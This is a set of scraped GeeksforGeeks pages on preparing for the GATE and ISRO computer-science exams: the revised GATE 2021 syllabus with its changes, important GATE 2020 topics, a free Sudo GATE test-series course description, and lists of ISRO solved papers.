contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : Computer SubjectGATE CSGBlog thumb_up 2 To-do Done 5 Based on 1 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page 5 Must-Have Skills You’ll Need In Your Hackathon Team Next last_page Introduction To FoxPro Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Computer Subject Parzen Windows density estimation techniquedos.h header in C with examplesWhat is Mobile Cloud Computing?Difference Between JSON and CSVIntroduction To RAT - Remote Administration Tool Most visited in GATE CS Layers of OSI ModelACID Properties in DBMSTypes of Operating SystemsFunctions of Operating SystemPage Replacement Algorithms in Operating Systems room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

GATE CS 2021 (Revised) Syllabus - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ GATE CS 2021 (Revised) Syllabus3 big changes in GATE 2021How to Prepare for GATE CS 2021GATE CS 2020 SyllabusImportant Topics for GATE 2020 Computer ScienceTop 5 Topics for Each Section of GATE CS SyllabusPrevious Year Gate CSE/IT papers with solutionsGATE Cut-offs needed to get into IITs, NITs, etcHow to prepare for GATE CSE – 2019GATE CS 2019 important dates and linksGATE CS 2018 Mock TestsGATE CSE Test Series – 2019 | Sudo GATEGate 2019 Mock Test | Geeksforgeeks Sudo-GATEOperating Systems | Set 2Operating Systems | Set 3Operating Systems | Set 4Operating Systems | Set 5Operating Systems | Set 6Operating Systems | Set 7Operating Systems | Set 8Operating Systems | Set 9Operating Systems | Set 10Operating Systems | Set 11Operating Systems | Set 12Operating Systems | Set 13Software Engineering | Coupling and CohesionSoftware Engineering | Prototyping ModelIntroduction to AlgorithmsDifference between NP hard and NP complete problem GATE CS 2021 (Revised) Syllabus Last Updated: 02-09-2020 IIT Bombay is organizing GATE 2021. In this year, The GATE authority 2021 has made major changes and has also revised the syllabus of various GATE Papers. For the CSE (Computer Science and Information Technology) paper, GATE authority has revised syllabus, we have compare syllabus of GATE CS 2020 and GATE CS 2021 and found these following changes. Though, they have completely updated Syllabus for General Aptitude (GA) and added two more topics : “Analytical Aptitude”, and “Spatial Aptitude”. There are following changes for Technical part of CSE : Syllabus of General Aptitude (GA) have completely updated and divided into four parts : Verbal Aptitude Quantitative Aptitude Analytical Aptitude Spatial Aptitude “Monoids” is added in the Discrete Mathematics, but it was inclusive part of “Groups” in previous syllabus. “Graph search” updated as “Graph traversals” in the Algorithms. “pipeline hazards” is added in the Computer Organization and Architecture. “Local optimisation”, “Data flow analyses: constant propagation, liveness analysis, common subexpression elimination.” is newly added in the Compiler Design. “System calls” and “I/O scheduling” are clearly added in the Operating System, but these were inclusive in the previous syllbus. There are major changes in the syllabus of computer networks. “IPv6”, “Basics of Wi-Fi”, “Network security: authentication, basics of public key and private key cryptography, digital signatures and certificates, firewalls.” are removed. “CIDR notation, Basics of IP support protocols (ARP, DHCP, ICMP), Network Address Translation (NAT), and Email” are added. A. Syllabus for General Aptitude (GA) Verbal Aptitude – Basic English grammar: tenses, articles, adjectives, prepositions, conjunctions, verb-noun agreement, and other parts of speech Basic vocabulary: words, idioms, and phrases in context Reading and comprehension Narrative sequencing Quantitative Aptitude – Data interpretation: data graphs (bar graphs, pie charts, and other graphs representing data), 2- and 3-dimensional plots, maps, and tables Numerical computation and estimation: ratios, percentages, powers, exponents and logarithms, permutations and combinations, and series Mensuration and geometry Elementary statistics and probability Analytical Aptitude – Logic: deduction and induction Analogy Numerical relations and reasoning Spatial Aptitude – Transformation of shapes: translation, rotation, scaling, mirroring, assembling, and grouping Paper folding, cutting, and patterns in 2 and 3 dimensions B. Computer Science and Information Technology Engineering Mathematics Section-1: Engineering Mathematics – Discrete Mathematics: Propositional and first order logic. Sets, relations, functions, partial orders and lattices. Monoids, Groups. Graphs: connectivity, matching, coloring. Combinatorics: counting, recurrence relations, generating functions. Linear Algebra: Matrices, determinants, system of linear equations, eigenvalues and eigenvectors, LU decomposition. Calculus: Limits, continuity and differentiability. Maxima and minima. Mean value theorem. Integration. Probability and Statistics: Random variables. Uniform, normal, exponential, poisson and binomial distributions. Mean, median, mode and standard deviation. Conditional probability and Bayes theorem. Computer Science and Information Technology Section-2: Digital Logic – Boolean algebra. Combinational and sequential circuits. Minimization. Number representations and computer arithmetic (fixed and floating point). Section-3: Computer Organization and Architecture – Machine instructions and addressing modes. ALU, data-path and control unit. Instruction pipelining, pipeline hazards. Memory hierarchy: cache, main memory and secondary storage; I/O interface (interrupt and DMA mode). Section-4: Programming and Data Structures – Programming in C. Recursion. Arrays, stacks, queues, linked lists, trees, binary search trees, binary heaps, graphs. Section-5: Algorithms – Searching, sorting, hashing. Asymptotic worst case time and space complexity. Algorithm design techniques: greedy, dynamic programming and divide-and-conquer. Graph traversals, minimum spanning trees, shortest paths Section-6: Theory of Computation – Regular expressions and finite automata. Context-free grammars and push-down automata. Regular and contex-free languages, pumping lemma. Turing machines and undecidability. Section-7: Compiler Design – Lexical analysis, parsing, syntax-directed translation. Runtime environments. Intermediate code generation. Local optimisation, Data flow analyses: constant propagation, liveness analysis, common subexpression elimination. Section 8: Operating System – System calls, processes, threads, inter-process communication, concurrency and synchronization. Deadlock. CPU and I/O scheduling. Memory management and virtual memory. File systems. Section-9: Databases – ER-model. Relational model: relational algebra, tuple calculus, SQL. Integrity constraints, normal forms. File organization, indexing (e.g., B and B+ trees). Transactions and concurrency control. Section-10: Computer Networks – Concept of layering: OSI and TCP/IP Protocol Stacks; Basics of packet, circuit and virtual circuit-switching; Data link layer: framing, error detection, Medium Access Control, Ethernet bridging; Routing protocols: shortest path, flooding, distance vector and link state routing; Fragmentation and IP addressing, IPv4, CIDR notation, Basics of IP support protocols (ARP, DHCP, ICMP), Network Address Translation (NAT); Transport layer: flow control and congestion control, UDP, TCP, sockets; Application layer protocols: DNS, SMTP, HTTP, FTP, Email. References – GATE 2020 Syllabi GATE 2021 Syllabi Attention reader! Don’t stop learning now. Get hold of all the important CS Theory concepts for SDE interviews with the CS Theory Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Top 5 Topics for Each Section of GATE CS SyllabusGATE CS 2020 SyllabusISRO SC/Engineer Recruitment for CS Students - Eligibility, Exam Pattern, SyllabusHow to Prepare for GATE CS 2021GATE CS 2021 Official Important DatesImportance of Sudo GATE CS 2021 Test Series3 big changes in GATE 2021What's Different In GSoC 2021 - Eligibility, Timeline, Stipend7 Most In-Demand and Well-Paying Career Options For 2021Start Your Preparation for Wipro Elite NTH 2021 NOW!7 Progressive Web App Development Frameworks to Know in 2021GATE | GATE-IT-2004 | Question 56GATE CSE Test Series - 2019 | Sudo GATEGate 2019 Mock Test | Geeksforgeeks Sudo-GATEGATE Cut-offs needed to get into IITs, NITs, etcHow to prepare in Last 10 days to score high in GATE?How to solve Relational Algebra problems for GATEPrevious Year Gate CSE/IT papers with solutionsGATE CS 2015GATE CS 2014Mithlesh UpadhyayCheck out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : Computer SubjectGATE CSGBlog thumb_up 18 To-do Done 3.1 Based on 8 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page 7 Must-Have Mobile Apps to Prepare for Online Interviews Next last_page 5 Online Education Etiquette That You Must Know in 2020 Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Computer Subject Software Engineering | Testing GuidelinesSoftware Engineering | Classification of Software RequirementsFunctional Programming ParadigmDraw a moving car using computer graphics programming in CParzen Windows density estimation technique Most visited in GATE CS Layers of OSI ModelACID Properties in DBMSTypes of Operating SystemsFunctions of Operating SystemPage Replacement Algorithms in Operating Systems room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Important Topics for GATE 2020 Computer Science - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ GATE CS 2021 (Revised) Syllabus3 big changes in GATE 2021How to Prepare for GATE CS 2021GATE CS 2020 SyllabusImportant Topics for GATE 2020 Computer ScienceTop 5 Topics for Each Section of GATE CS SyllabusPrevious Year Gate CSE/IT papers with solutionsGATE Cut-offs needed to get into IITs, NITs, etcHow to prepare for GATE CSE – 2019GATE CS 2019 important dates and linksGATE CS 2018 Mock TestsGATE CSE Test Series – 2019 | Sudo GATEGate 2019 Mock Test | Geeksforgeeks Sudo-GATEOperating Systems | Set 2Operating Systems | Set 3Operating Systems | Set 4Operating Systems | Set 5Operating Systems | Set 6Operating Systems | Set 7Operating Systems | Set 8Operating Systems | Set 9Operating Systems | Set 10Operating Systems | Set 11Operating Systems | Set 12Operating Systems | Set 13Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...What is Memory Leak? How can we avoid?Tree Traversals (Inorder, Preorder and Postorder)Must Do Coding Questions Company-wisePractice for cracking any coding interview Important Topics for GATE 2020 Computer Science Last Updated: 04-05-2020 Register for Sudo GATE These topics are categorized based on the previous GATE CS Papers: Regularly covered topics Maximum weightage topics Easy level topics Difficult level topics Other Important topics Section: Mathematics Propositional logic and predicate logic Matrix determinant and eigen values Conditional probability Graph connectivity Relations Mathematical logic Linear algebra Propositional logic Linear algebra Graph theory Probability Predicate logic Groups functions Lattice theory Counting Section: Algorithms Algorithm Analysis Heap trees Sorting Graph Algorithms Sorting algorithms Searching and sorting algorithms Divide and conquer Greedy algorithms Divide and conquer Dynamic programming algorithms Section: Programming and Data Structures Recursive programs Trees and graphs Trees Stacks and Queues Trees Recursive functions, and pointers Section: Operating Systems CPU Scheduling Algorithms Paging Semaphores Page replacement algorithms Page replacement algorithms Paging CPU Scheduling Page replacement Semaphore Paging and Segmentation Disk scheduling algorithms Deadlock Section: Databases Relational Algebra SQL Serializability Relational Tuple SQL queries Normalization Relational algebra Transactions SQL ER-diagrams Section: Computer Networks IP Addressing TCP and UDP Application protocols Congestion control IP Addressing TCP Ethernet IP addressing Routing Algorithms Encyption and Decryption algorithms Section: Computer Organization and Architecture Pipelining Cache organization Addressing modes Cache organization Addressing modes and Machine cycles Cache organization Pipelining I/O Data transfer Section: Theory of Computation DFA and Regular expression Closure properties and Undecidability Regular languages Undecidability Regular expressions Closure properties Undecidability CFL and DCFL Formal grammars and CNF Section: Compiler Design LL(1) and LR parsers Parsing Lexical Analysis and syntax Analysis Intermediate code generation Syntax directed translations(SDTs) Run time environments Section: Digital Logic Combinational circuits: Multiplexer, decoder and demultiplexer Minimization Counters Combinational circuits Minimization Combinational circuits Sequential circuits Number system, fixed and floating point numbers Registers Section: Numerical and Verbal Ability Numerical computation Data interpretation Sentence completion Word analogies GATE CS 2019 topic wise notes GATE CS Previous Year Solved Papers Last minutes notes for GATE CS If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Recommended Posts:Subjectwise Important Topics for GATE 2020 Computer ScienceGATE CS 2020 Important Official DatesTop 5 Topics for Each Section of GATE CS SyllabusGATE 2016 Important Dates and LinksGATE 2017 Important dates and linksGATE CS 2019 important dates and linksGATE CS 2021 Official Important DatesThings one should know before choosing Computer Science as their majorTop 5 PSUs for Computer Science Engineers in IndiaWhy is programming important for first year or school students?10 Important Android Studio Shortcuts You Need the MostMost important type of AlgorithmsImportant functions of STL Components in C++Computer Organization | Performance of ComputerDifferences between Computer Architecture and Computer OrganizationGATE | GATE CS 2020 | Question 40GATE | Sudo GATE 2020 Mock III (24 January 2019) | Question 15GATE | Sudo GATE 2020 Mock III (24 January 2019) | Question 16GATE | Sudo GATE 2020 Mock III (24 January 2019) | Question 17GATE | Sudo GATE 2020 Mock III (24 January 2019) | Question 18 Article Tags : ArticlesGATEGATE CS thumb_up 12 To-do Done 3 Based on 2 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page GATE | GATE CS 1996 | Question 75 Next last_page Priority CPU Scheduling with different arrival time – Set 2 Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Articles Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Analysis of Algorithms | Set 1 (Asymptotic Analysis)find command in Linux with examplesHow to write a Pseudo Code? Most visited in GATE GATE | GATE CS 2012 | Question 33GATE | GATE CS 1996 | Question 39GATE | GATE-CS-2005 | Question 41GATE | Gate IT 2005 | Question 79GATE | GATE-CS-2014-(Set-2) | Question 20 room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Course | Sudo GATE 2021 Geeksforgeeks close Problems Courses Get Hired close Sign In Sign In Problems Courses Get Hired Discussion ▲ × × Message Error OK × Note: For issues in your code/test-cases, please use Comment-System of that particular problem. Details Cancel Send × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password If you are facing any issue or this is taking too long, please click to join directly. Exit Sudo GATE 2021 A free test series for GATE aspirants to test their preparations and be one step ahead of the contestants GATE CSE Aspirants Online Course Sudo GATE 2021 Active Free Course 5.0 View Testimonials Login to Sign Up for Free Course Features Features: Track and improve your skills Resemble with the standard of GATE Weekly subjectwise Tests Provided detailed explanation after test Important internal & external links of posts, and blogs Free of Cost Theory, Tracks, and Contests: Contents: Important Articles, Blogs, and Notes from GeeksforGeeks Important Articles, Blogs, and Notes from Online Various Sources Organized Contents Subjective Tracks, which will contain Important Questions based on Regularly Covered & Maximum Weightage Topics Subjective Contests, which will contain fresh Questions according latest GATE pattern Full Lenght Mock Tests, which will conver syllabus of GATE CS and weightage as per GATE previous question papers Weekly Tests: 11 Subjective Tracks 11 Subjetive Contests 3 Full Lenght Contests 30 Questions in each Subjective Track & Contest 75 Minutes for each Subjective Contest but there is no time limit for any Track 65 Questions in each Full Lenght Contest 165 Minutes for each Full Lengh Contest Course Overview An extensive Online Test Series for GATE CSE to boost your preparation. Test series is designed considering the pattern of previous years GATE papers and ensures to resemble with the standard of GATE exam. Sudo GATE will help the aspirants track and improve the preparation through questions of various difficulty levels. There will be two Test Series covering the whole syllabus of GATE, including Mathematics and Aptitude. Tracks will cover important questions from previous GATE CS exams, whereas in Contests will have contain fresh questions. Explanation of each question will be provided at the end of each Test. There will be 11 subjective Tracks, 11 Subjective Contests and 3 full length Contests. Note that we will also provide internal and external links of important articles and notes. Sudo GATE is completely free of cost for you. Course Content Contents Important Articles, Blogs, and Notes from GeeksforGeeks Important Articles, Blogs, and Notes from Online Various Sources Organized Contents Subjective Tracks 11 Subjective Tracks, which will contain Privious GATE CS Questions based on Regularly Covered & Maximum Weightage Topics No. of questions: 30 Duration: No time limit Schedule: Track 1: General Aptitude Track 2: Engineering Mathematics Track 3: Algorithms Track 4: Programming and Data Structures Track 5: Operating System Track 6: Computer Organization and Architecture Track 7: Databases Track 8: Computer Networks Track 9: Theory of Computation Track 10: Compiler Design Track 11: Digital Logic Subjective Contests 11 Sujective Contests, which will contain fresh Questions according latest GATE pattern No. of questions: 30 Duration: 75 minutes Schedule: Contest 1: General Aptitude Contest 2: Engineering Mathematics Contest 3: Algorithms Contest 4: Programming and Data Structures Contest 5: Operating System Contest 6: Computer Organization and Architecture Contest 7: Databases Contest 8: Computer Networks Contest 9: Theory of Computation Contest 10: Compiler Design Contest 11: Digital Logic Mock 1 Full Length test Date : 15th December, 2020. Total Questions: 65 questions (Comprising of all subjects) Duration: 165 minutes Mock 2 Full Length test Date : 1st January, 2021. Total Questions: 65 questions (Comprising of all subjects) Duration: 165 minutes Mock 3 Full Length test Date : 16th January, 2021. Total Questions: 65 questions (Comprising of all subjects) Duration: 165 minutes FAQs What I have to pay for these Test series? You just have to pay your efforts and precious time. Yes, Sudo GATE is completely Free of Cost course with the intension to help more and more GATE aspirants. Do the tests have a predefined schedule? Yes! Both subject-wise tests and Mock tests are weekly scheduled. You can visit the above-given schedule table. Schedule and other descriptions are also given in Sudo GATE course page. What are Subject-wise practice Tracks? Subject-wise practice tracks are nothing but already asked GATE questions, but designed in a well-organized order. Questions in the Tracks will be arranged based on the topic and complexity, which will very useful while solving Will I get solution after attempting the Test? Yes, We will provide detailed explanation after the test completion. This will help the aspirants to clear the doubts and improve problem-solving skills. What is time duration of individual tests? The subject wise test series will be of 75 minutes duration. Full length mock tests will be of 165 minute. What are the contents of the course? The course includes: Important Articles, Blogs, and Notes from GeeksforGeeks Important Articles, Blogs, and Notes from Online Various Sources Subjective Tracks, which will contain Important Questions based on Regularly Covered & Maximum Weightage Topics Subjective Contests, which will contain fresh Questions according latest GATE pattern Full Lenght Mock Test, which will conver syllabus of GATE CS and weightage as per GATE previous question paper How frequently will the test happen? The test will be organized weekly (Friday). In case of any further query and doubt, please contact us at review-team@geeksforgeeks.org Course Registration Previous Batches Batch Date Type Register Sudo GATE Active Online Classes Registration Closed Active Batches Batch Date Type Register Sudo GATE 2021 Active Online Classes Login to Register Testimonials × Sudo GATE 2021 5.0 Close × Message Error Okay! × Please report if you are facing any issue on this page. Issue Type * Select Issue Content Related Issue Sofware Related Issue Examples of Content related issues .Software related issues .For queries regarding questions and quizzes, use the comment area below respective pages. Describe Your Issue * Attach Screenshot (optional) Send Close room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved

ISRO CS previous year solved papers - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects ISRO CS previous year solved papers The page contains solutions of previous year ISRO CS papers with explanations, topic wise Quizzes, notes/tutorials and important links for preparation. ISRO CS 2020 ISRO CS 2018 ISRO CS 2017 – May ISRO CS 2017 – Dec ISRO CS 2016 ISRO CS 2015 ISRO CS 2014 ISRO CS 2013 ISRO CS 2011 ISRO CS 2009 ISRO CS 2008 ISRO CS 2007 These are useful links: Topic-wise Notes Last Minute Notes ISRO CSE Syllabus for Scientist/Engineer Exam Articles on Computer Science Subjects ISRO original papers and official Keys My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most Visited Articles How to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

ISRO original papers and official Keys - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS 